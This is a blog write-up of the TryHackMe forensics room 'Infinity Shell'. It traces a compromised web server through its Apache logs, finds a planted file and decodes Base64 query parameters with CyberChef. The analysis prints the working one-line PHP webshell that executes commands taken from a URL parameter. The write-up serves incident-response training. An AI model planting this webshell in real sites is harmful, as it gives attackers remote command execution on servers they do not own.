---
title: "TryHackMe – Infinity Shell"
date: 2026-02-23 00:00:00 +0100
categories: [Writeups, TryHackMe]
tags: [infinity-shell, easy, forensics, log-analysis, webshell, base64]
published: true
image:
  path: /assets/img/posts/infinity-shell/cover.png
  alt: "Infinity Shell"
---

## Overview

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Room/Machine | Infinity Shell |
| Difficulty | Easy |
| Tags | forensics, log-analysis, webshell, base64 |

This room is a **blue team forensics challenge**: no exploitation, no privilege escalation. You're handed a compromised machine and asked to reconstruct what happened. The attack vector turns out to be a one-line PHP webshell planted inside a CMS image directory — executing system commands passed as Base64-encoded parameters, and leaving clear traces in the Apache access logs.

---

## Approach

Unlike typical CTF rooms, there is no target service to attack and no obvious starting point given. The challenge begins with a simple question: *where do you even start?*

A web server is involved, so the logs seem like the right place — and that turns out to be correct.

---

## Investigation

### Step 1 – Locating the Logs

Starting at `/var/log/`, the standard location for system and service logs on Linux:

```bash
ls -la /var/log/apache2/
```

<img src="/assets/img/posts/infinity-shell/log-directory.png" alt="Apache2 log directory listing showing other_vhosts_access.log.1 at 33908 bytes" width="700">

The `apache2/` directory contains several log files. Two stand out immediately by comparison: `access.log` and `other_vhosts_access.log` are both empty (0 bytes), while their rotated counterparts carry actual content. `other_vhosts_access.log.1` at **33908 bytes** is the obvious candidate — large enough to contain meaningful activity, preserved from the previous rotation before being cleared.

The `.1` extension indicates a rotated log. Apache rotates logs periodically, moving the current log to `.1` and starting a fresh file. Attack activity from a previous session is often preserved here even if the live log has been wiped.

### Step 2 – Source Code Review

Before filtering the logs, it helps to understand what's running on this server. The web root at `/var/www/html/CMSsite-master/` contains PHP files, JavaScript, and a SQL schema — a standard CMS structure. A closer look at the `img/` directory reveals something unusual:

```bash
ls -la /var/www/html/CMSsite-master/img/
```

<img src="/assets/img/posts/infinity-shell/img-directory.png" alt="Directory listing of CMSsite-master/img showing images.php at only 48 bytes among hundreds of image files" width="700">

Every other file in this directory is a `.jpg`, `.JPG`, or `.png`. Among them sits `images.php` — **48 bytes**, dated March 6 2025, while all legitimate image files date from 2022. Two anomalies at once: wrong extension for this directory, and a much more recent modification date than everything around it.

Reading the file confirms the suspicion:

```bash
cat images.php
```

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This is a textbook one-liner webshell. It takes whatever is passed in the `?query=` URL parameter, decodes it from Base64, and executes it directly as a system command. The Base64 encoding adds no real security — it's trivially reversible — but it does make the payload less immediately readable in logs.

### Step 3 – Filtering the Access Logs

With the webshell identified, the logs can be filtered to find all requests that hit it:

```bash
cat /var/log/apache2/other_vhosts_access.log.1 | grep "images.php"
```

<img src="/assets/img/posts/infinity-shell/log-grep.png" alt="grep output showing multiple requests to images.php, first as 404 then 500 then 200 with base64-encoded query parameters" width="700">

The output tells a clear story of the attack progression:

- Early requests return **404** — the attacker is probing, the shell isn't planted yet
- Then **500** responses — the shell exists but something is misconfigured or the payload is failing
- Finally **200** responses with `?query=` parameters — the shell is active and executing

Each successful request carries a different Base64-encoded string as the `?query=` value. These are the commands the attacker ran on the system.

### Step 4 – Decoding the Payload

Several `?query=` values appear across the log entries. Longer Base64 strings indicate more complex payloads — more data being passed or returned. The longest string is the natural first target.

Copying it into [CyberChef](https://gchq.github.io/CyberChef/) with the **From Base64** operation decodes the payload and reveals the flag embedded in the command.

> CyberChef is a good tool for this — paste in the Base64 string, apply **From Base64**, and the decoded content is immediately visible. It also avoids running anything directly on the machine being investigated.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `ls -la` | Directory listing with sizes and timestamps to identify anomalies |
| `cat` + `grep` | Log filtering to isolate requests to the webshell |
| CyberChef | Safe, offline-capable Base64 decoding of extracted payloads |

---

## Flags

Flags are intentionally omitted. The flag is embedded in the decoded content of the longest Base64-encoded `?query=` parameter found in the filtered log entries.

---

## Lessons Learned

**`/var/www/html` is the default Apache web root.** This took me a while to figure out at the start — I knew I was looking at a web server compromise but wasn't sure where the actual site files would be. Knowing that Apache serves from `/var/www/html/` by default is a fundamental piece of context that made the rest of the investigation much more straightforward.

**Start with the logs — and check file sizes.** I went to `/var/log/apache2/` fairly early, but `ls -la` made the relevant file obvious immediately: the live logs were empty while `other_vhosts_access.log.1` was sitting at 33908 bytes. That size difference is a useful triage signal.

**An unexpected file in the wrong directory is worth reading.** `images.php` in an image folder is easy to scroll past. The file size (48 bytes) and the 2025 date among 2022 files are what made it stand out under `ls -la`. One `cat` later and the webshell was confirmed.

**Base64 looks like noise until you decode it.** The `?query=` parameters in the log looked like gibberish at first glance. Running them through CyberChef makes the actual commands immediately readable — and that's where the flag was hiding.

**The log tells a story if you read it in order.** The 404 → 500 → 200 sequence in the filtered output wasn't something I immediately recognised, but looking at it afterwards it maps to a clear progression: the attacker probing before the shell existed, then errors during setup, then successful execution. That kind of timeline is useful to keep in mind for future log analysis.

---

## References

- [OWASP – Web Shell](https://owasp.org/www-community/attacks/Web_Shell)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [TryHackMe Room](https://tryhackme.com/room/hfb1infinityshell)
